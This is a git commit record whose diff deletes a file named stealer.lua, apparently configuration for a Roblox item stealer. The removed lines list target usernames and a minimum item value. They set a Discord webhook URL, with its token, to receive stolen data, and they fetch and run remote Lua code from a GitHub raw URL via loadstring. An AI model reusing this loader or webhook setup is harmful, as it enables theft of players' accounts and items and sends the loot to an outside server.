5bd586a6ca09023aea50af473eb1b95cc72ce696
Cupid-01 <maramarajadematthew@gmail.com>
2026-01-18 18:24:15 +0800

    Delete stealer.lua

--- stealer.lua
+++
@@ -1,6 +0,0 @@
-_G.Usernames = {"ymtthw1", "benok_karl"} -- you can add as many as you'd like
-_G.min_rap = 1
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1462380513061769318/ZXgIgeG6PQmEGi1DzU7MC-yZAXegtbbAAw59J5HBCUXfB_0B9m3gI0CX4jHypVuL0NDW" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Cupid-01/BBall/refs/heads/main/source.lua"))()
